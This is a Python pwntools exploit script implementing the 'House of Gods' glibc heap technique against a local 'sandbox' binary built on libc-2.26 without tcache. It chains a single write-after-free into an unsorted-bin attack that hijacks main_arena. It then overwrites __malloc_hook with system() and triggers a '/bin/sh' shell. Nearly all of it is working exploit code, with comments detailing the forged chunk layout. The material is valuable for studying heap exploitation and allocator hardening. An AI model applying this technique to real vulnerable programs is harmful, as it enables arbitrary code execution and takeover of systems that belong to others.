#!/usr/bin/python3

from pwn import *

#
# --- House of Gods (second revision) ---
#
# A technique to hijack the arena within only 9 allocations and
# gain arbitrary code execution by tampering with the __malloc_hook.
#
# rootcause: a single UAF (write-after-free) on a non-fastsized chunk is
# enough to initiate the House of Gods.
#
# -> tested against: libc-2.26-no-tcache
#
# --- chunk description ---
#
# UAF: rootcause of this exploit. A single write-after-free on this
# chunk, in order to open up the unsorted-bin, allows the attacker to
# forge a chain within the unsorted-bin. This chunk will be linked
# with BMC.
#
# BMC: binmap chunk starting at main_arena+0x850. This fakechunk naturally
# points to main_arena+0x0 since (main_arena+0x850).bk = main_arena.next = main_arena+0x0
#
# main_arena+0x0: although never allocated directly, this fakechunk serves as a
# transition from BMC to FC0. FC1, another free'd fast-sized chunk (0x20) forms the
# fake sizefield of the main_arena+0x0 fakechunk.
#
# FC1: this one is only here to forge a fake sizefield by linking it into
# the 0x20-fastbin.
#
# FC0: this chunk's bk points to the intermediate chunk INTM.
#
# INTM: a smallchunk/largechunk used to initiate an unsorted-bin attack. Its
# bk points to the victim of the unsorted-bin attack.
#
# HOOK: this chunk overlaps the __malloc_hook.
#
# FAKE_ARENA: this chunk holds a partial fake arena. 
#
# --- unsorted-bin chain ---
#
#   [exact-fit #1]                         [exact-fit #2]
#         v                                       v
# UAF -> BMC -> main_arena+0x0 -> FC0 -> FC1 -> INTM -> narenas-0x10
#     bk     bk                bk     bk     bk      bk
#

# =========================== globals ===========================

script = '''
continue
'''

# reference counter
ref = 0;

# max malloc request
max_request = 0xffffffffffffffbf;

# =========================== main ===========================

def main():

    context.clear(arch = 'amd64');

    elf  = context.binary = ELF("sandbox");
    libc = ELF(elf.runpath + b"/libc.so.6");
    io   = initialize_io(elf);
    
    io.timeout = 0.1;

    # leaking required libbase
    libc.address = leak_libbase(io, libc.sym.puts);
    log.info("leaked libbase: " + hex(libc.address));

    # leaking required heapbase
    heapbase = leak_heapbase(io);
    log.info("leaked heapbase: " + hex(heapbase));

    #-#-#-#-#-#-#-#-#-#-#-# preparation phase #-#-#-#-#-#-#-#-#-#-#-# 

    FAKE_ARENA = allocate_chunk(io, 0x28);

    layout  = p64(0x0000000000000000) + p64(0x0000000000000000);
    layout += p64(0x0000000000000000) + p64(0x0000000000000000);
    layout += p64(libc.sym.__malloc_hook - 0x23);

    edit_chunk(io, FAKE_ARENA, layout);

    #-#-#-#-#-#-#-#-#-#-#-# stage 1 - binmap attack #-#-#-#-#-#-#-#-#-#-#-#

    UAF  = allocate_chunk(io, 0x88);
    FC0  = allocate_chunk(io, 0x38);
    FC1  = allocate_chunk(io, 0x18);
    INTM = allocate_chunk(io, 0x98);

    free_chunk(io, UAF);

    bk = libc.sym.main_arena + 0x0850;
    edit_chunk(io, UAF, p64(0x0) + p64(bk));

    bk = heapbase + 0x30 + 0x90 + 0x40 + 0x20;
    edit_chunk(io, FC0, p64(0x0) + p64(bk));

    bk = libc.sym.narenas - 0x10;
    edit_chunk(io, INTM, p64(0x0) + p64(bk));

    free_chunk(io, FC0);
    free_chunk(io, FC1);

    BMC = allocate_chunk(io, 0x1f8);

    #-#-#-#-#-#-#-#-#-#-#-# stage 2 - hijacking the arena #-#-#-#-#-#-#-#-#-#-#-#

    _next             = heapbase;
    _next_free        = 0x0000000000000000;
    _attached_threads = 0x0000000000000001;
    _system_mem       = 0xffffffffffffffff;
    _max_system_mem   = 0xffffffffffffffff;

    payload  = p64(0)           + p64(_next);
    payload += p64(_next_free)  + p64(_attached_threads);
    payload += p64(_system_mem) + p64(_max_system_mem);

    edit_chunk(io, BMC, payload);
    INTM = allocate_chunk(io, 0x98);

    allocate_chunk(io, max_request + 1);
    allocate_chunk(io, max_request + 1);

    #-#-#-#-#-#-#-#-#-#-#-# stage 3 - arbitrary code execution #-#-#-#-#-#-#-#-#-#-#-#

    HOOK    = allocate_chunk(io, 0x68);
    handler = libc.sym.system;

    edit_chunk(io, HOOK, p8(0) * 0x13 + p64(handler));
    allocate_chunk(io, next(libc.search(b"/bin/sh")));

    io.interactive();
    log.info("thanks.");

# =========================== functions ===========================

def leak_libbase(io, puts):

    io.recvuntil(b"libbase: ");
    return int(io.recvline(), 16);

def leak_heapbase(io):

    io.recvuntil(b"heapbase: ");

    leak = int(io.recvline(), 16);
    io.recvuntil(b"> ");

    return leak;

# =========================== wrappers =========================== 

def allocate_chunk(io, size):

    global ref;

    io.send(b"1\n");
    io.recvline();
    io.sendline(f"{size}".encode());
    io.recvuntil(b"> ");

    ref += 1;
    return ref - 1;

def free_chunk(io, ref):

    io.send(b"2\n");
    io.recvline();
    io.sendline(f"{ref}".encode());
    io.recvuntil(b"> ");

def edit_chunk(io, ref, data):

    io.send(b"3\n");
    io.recvline();
    io.sendline(f"{ref}".encode());
    io.recvline();
    io.send(data);
    io.recvuntil(b"> ");

def read_chunk(io, ref):

    io.send(b"4\n");
    io.recvline();
    io.sendline(f"{ref}".encode());

    chunkdata = io.recvline();
    io.recvuntil(b"> ");

    return chunkdata;

def initialize_io(elf):

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = script);

    return process(elf.path);

# =========================== init main ===========================

if __name__=="__main__":

   main();
